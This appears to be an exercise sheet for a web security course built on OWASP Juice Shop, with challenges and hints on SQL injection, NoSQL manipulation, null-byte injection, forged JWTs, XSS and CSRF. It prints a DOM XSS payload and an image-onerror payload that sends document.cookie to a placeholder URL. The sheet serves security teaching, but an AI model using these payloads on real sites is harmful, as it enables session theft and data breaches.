# Exercises

Make sure you understand the feature you are analysing for vulnerabilities.
Before attempting any exploits, walk the "happy path" and investigate if the feature works as expected.


## Zero Stars

Give a devestating zero-start feedback to the store. You find the feedback form at `/#/contact`.

<details>
  <summary>❓ Hint 1</summary>
Can you enable the button with the developer tools?

</details>

<details>
  <summary>❓ Hint 2</summary>
There is another way: Use ZAP to find the request and replay it with a 0 value.
    
</details>

<details>
  <summary>📚 Solution</summary>
### Approach 1

- Visit `/#/contact`
- Don't change the rating, enter some comment and solve the CAPTCHA
- Right click on the submit button and inspect the element
- Remove the `disabled="true"` attribute
- Submit the form by clicking submit

<img src="/../solutions/screenshots/zero-star-sol1.png" alt="Screenshot that explains how to remove the disabled attribute of the button"/>

### Approach 2

</details>


## Payback Time

Place an order that makes you rich.

<details>
  <summary>❓ Hint 1</summary>
When you order an item, you pay money. When you sell an item, you are being paid. Basic economics.
</details>

<details>
  <summary>❓ Hint 2</summary>
Have you tried ordering a negative amount of items?
</details>


## Confidential Document

Access a confidential document.
Reading the about us (`/#/about`) might nudge you in the right direction.


<details>
  <summary>❓ Hint 1</summary>
Robots are certainly disallowed to access confidential files.
How would you tell google to hide a directory?
</details>


## View Basket

You need some inspiration on what to buy. View another user's shopping basket.

<details>
  <summary>❓ Hint 1</summary>
Observe the HTTP traffic using ZAP when shopping. Is there a request with an interesting parameter that you could change in your favor?
</details>


## Forged Review

Privacy is important. Post a product review as another user or edit any user's existing review.

<details>
  <summary>❓ Hint 1</summary>
Observe the HTTP traffic using ZAP while submitting a review for the "Apple Juice". Can you alter any interesting parameters when sending a request to `/rest/products/1/reviews`?
</details>


## Login Admin

Sometimes it is boring to be a normal user. Login as the administrator (admin@juice-sh.op) instead.

<details>
  <summary>❓ Hint 1</summary>
User credentials are generally stored in a database, can you perform an injection that results in a positive query reply?
</details>

<details>
  <summary>❓ Hint 2</summary>
Don't forget to comment out the trash after the injected commands.
</details>


## User Credentials

Data is power. Steal all user credentials by abusing the search functionality.

<details>
  <summary>❓ Hint 0 (the endpoint)</summary>
The vulnerable (legacy) search endpoint is located under the following path `/rest/products/search?q=<SEARCH QUERY>`.
</details>

<details>
  <summary>❓ Hint 1</summary>
The endpoint is vulnerable to SQL injections.
When exploiting a SQL injection, make sure that you know how to properly close the query.
Start by crafting a simple query that doesn't result in an error (e.g. does `test';--` work, or are there for instance any open brackets left?)
</details>

<details>
  <summary>❓ Hint 2</summary>
Exploit the SQLi by crafting an `UNION SELECT` query to join the data from another table to the results.
</details>

<details>
  <summary>❓ Hint 3</summary>
Use the `sqlite_schema` table to extract the relevant table names.
</details>

<details>
  <summary>❓ Hint 4</summary>
Use the `PRAGMA_TABLE_INFO('TABLE NAME GOES HERE')` table to extract the relevant column names.
</details>


## NoSQL Manipulation

Look at the endpoint `PATCH /rest/products/reviews`.
Update multiple product reviews at the same time.

```javascript
module.exports = function productReviews () {
  return (req, res, next) => {
    const user = security.authenticatedUsers.from(req)
    db.reviews.update(
      { _id: req.body.id },
      { $set: { message: req.body.message } },
      { multi: true }
    ).then(
      result => {
        res.json(result)
      }, err => {
        res.status(500).json(err)
      })
  }
}
```

<details>
  <summary>❓ Hint 1</summary>
Read the documentation of
<a href="https://www.mongodb.com/docs/manual/reference/method/db.collection.update/">`db.collection.update` documentation</a>
and the <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">query operators documentation</a>.

Which query allows you to change multiple reviews at the same time?
</details>


## Null-Byte Injection

Download `/ftp/package.json.bak`.
Note node.js handles null-bytes differently than the underlying library which is written in C.

<details>
  <summary>❓ Hint 1</summary>
In C strings are terminated by a NULL byte.
Thus the string "hello.txt■.md" (with ■ representing the NULL byte) will be seen as "hello.txt■.md" in node.js, but as "hello.txt" in the low level library that opens the file.
How can this be exploited, when the access verification happens in node.js?
</details>

<details>
  <summary>❓ Hint 2</summary>
A url encoded null byte is represented as "%00", however, make sure you properly encode it when submitting the request.
</details>


## Federated Authentication

Find a website with a social login and use ZAP to observe what happens when you sign in.  
Example: https://oag.azurewebsites.net


## JSON Web Token
Analyze a JWT from the shop with https://jwt-attacker.onrender.com

- What claims are in the token?
- How is it signed?


## Unsigned JWT

Forge an essentially unsigned JWT that impersonates the (non-existing) user jwtn3d@juice-sh.op.

<details>
  <summary>❓ Hint 1</summary>
Exploit a weird option, that is available when signing tokens with JWT.
</details>

<details>
  <summary>❓ Hint 2</summary>
The weird option is the none algorithm ;)
</details>


## DOM XSS

Perform a DOM XSS attack with the following payload: `<iframe src="javascript:alert(`xss`)">`.

<details>
  <summary>❓ Hint 1</summary>
Did you try searching?
</details>


## Blind Persistent XSS

Perform a (blind) persistent XSS attack bypassing a client-side security mechanism.

- The admin can see a list of all users on `/#/administration`
- Admin login: admin@juice-sh.op / admin123

Can you extract the cookies and send it to you (https://requestbin.net/ might be helpful)?

<details>
  <summary>❓ Hint 1</summary>
What information is displayed to the admin? When can you set it?
</details>

<details>
  <summary>❓ Hint 2</summary>
When registering a new user the endpoint `/api/Users` is contacted. This looks interesting...
</details>

<details>
  <summary>❓ Hint 3 (Cookie exfiltration)</summary>
Have you tried the following?
```
<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
```
</details>


## Content Security Policy

Search for a websites with a CSP. How does the CSP of your favorite bank look like?


## CSRF

Change the name of a user by performing Cross-Site Request Forgery from another origin.

- Make your own attacker web-site that changes a logged-in user's Juice Shop username when she/he visits your site.
- Note: You need to use Firefox, because it does not treat cookies as `same-site=lax` per default.
- Can you do it with a CORS request and an autosubmitting `<form>`?
- Use a local file or `https://htmledit.squarefree.com` to simulate a different website.

<details>
  <summary>❓ Hint 1</summary>
`POST /profile`
</details>


## Frontend Typosquatting

[Inform the shop](http://localhost:3000/#/contact) about a typosquatting imposter that dug itself deep into the frontend (Mention the exact name of the culprit in the contact form).

<details>
  <summary>❓ Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>


## Vulnerable Library

[Inform the shop](http://localhost:3000/#/contact) about a vulnerable library it is using (Mention the exact library name and version in your comment).

<details>
  <summary>❓ Hint 1</summary>
Inspect the package.json.bak from the <a href="#null-byte-injection">Null-Byte Injection exercise</a>.
</details>


## Dependency Scanning

Use Snyk or any other dependency scanner to analyze the Juice Shop's dependencies.

- Are there any outdated packages?
- How severe are the issues?


## OWASP ZAP Scanning

Use OWASP ZAP to perform an automated dynamic test of your Juice Shop.

`docker run --net=host -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000`

- What kind of vulnerabilities does it find?
- Do you think it is useful?
- If you are interested, try the full scan.
